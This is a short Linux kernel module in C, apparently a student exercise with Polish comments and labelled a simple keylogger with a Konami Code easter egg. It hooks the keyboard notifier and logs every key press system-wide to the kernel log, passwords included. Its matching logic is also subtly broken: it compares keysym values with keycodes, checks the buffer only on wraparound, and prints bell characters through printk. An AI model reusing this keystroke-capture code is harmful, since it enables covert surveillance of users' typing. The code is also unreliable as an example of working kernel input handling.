#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/keyboard.h>
#include <linux/ktime.h>
#include <linux/timer.h>
#include <linux/printk.h>

// Sekwencja Konami Code
static const int konami_code[] = { KEY_UP, KEY_UP, KEY_DOWN, KEY_DOWN, KEY_LEFT, KEY_RIGHT, KEY_LEFT, KEY_RIGHT, KEY_B, KEY_A };
#define KONAMI_CODE_LENGTH (sizeof(konami_code) / sizeof(konami_code[0]))

// Bufor na nacisnięte klawisze
static int input_buffer[KONAMI_CODE_LENGTH];
static int buffer_index = 0;

// Funkcja do sprawdzania sekwencji Konami Code
static bool check_konami_code(void) {
    int i;
    for (i = 0; i < KONAMI_CODE_LENGTH; i++) {
        if (input_buffer[i] != konami_code[i]) {
            return false;
        }
    }
    return true;
}

// Funkcja obslugujaca nacisniecia klawiszy
int keylogger_callback(struct notifier_block *nblock, unsigned long action, void *data) {
    struct keyboard_notifier_param *param = data;

    if (action == KBD_KEYSYM && param->down) { 
        printk(KERN_INFO "Nacisniety klawisz: %d\n", param->value);

        // Dodanie klawisza do bufora
        input_buffer[buffer_index] = param->value;
        buffer_index = (buffer_index + 1) % KONAMI_CODE_LENGTH;

        // Sprawdzenie sekwencji
        if (buffer_index == 0 && check_konami_code()) {
            printk(KERN_INFO "Konami Code wykryty! Uruchamianie Easter Egg.\n");
            
            // Sygnal dzwiekowy 
            printk(KERN_INFO "\a\a\a"); 

            // Wyskakujacy komunikat
            printk(KERN_INFO "Gratulacje! Odkryłeś Easter Egg!\n");
        }
    }

    return NOTIFY_OK;
}

// Struktura callback
static struct notifier_block keylogger_nb = {
    .notifier_call = keylogger_callback
};

// Funkcja inicjalizacyjna
static int __init keylogger_init(void) {
    printk(KERN_INFO "Modul zaladowany\n");
    register_keyboard_notifier(&keylogger_nb); // Rejestracja callback
    return 0;
}

// Funkcja konczaca
static void __exit keylogger_exit(void) {
    unregister_keyboard_notifier(&keylogger_nb); // Wyrejestrowanie callback
    printk(KERN_INFO "Modul wyladowany\n");
}

module_init(keylogger_init);
module_exit(keylogger_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Student");
MODULE_DESCRIPTION("Prosty keylogger z funkcją Konami Code - Easter Egg");
